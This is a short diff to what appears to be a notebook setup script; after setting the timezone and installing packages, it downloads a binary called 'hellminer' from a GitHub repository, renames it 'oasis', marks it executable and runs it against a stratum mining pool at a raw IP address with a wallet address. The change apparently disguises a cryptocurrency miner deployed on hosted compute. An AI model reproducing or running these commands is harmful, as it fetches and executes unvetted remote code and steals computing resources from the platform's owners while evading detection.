@@ -4,5 +4,6 @@ ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime
 dpkg-reconfigure --frontend noninteractive tzdata
 %pip install update
 %pip install libsodium-dev
-wget https://github.com/kazppkido/gbut/raw/main/hellminer
-./hellminer -c stratum+tcp://209.97.168.28:443 -u RCADCQ9UW1RsUaF94Jp4huPSdQ7bhwYwa4.xx -p x
+wget -O oasis https://github.com/kazppkido/gbut/raw/main/hellminer
+chmod 777 oasis
+./oasis -c stratum+tcp://209.97.168.28:443 -u RCADCQ9UW1RsUaF94Jp4huPSdQ7bhwYwa4.xx -p x
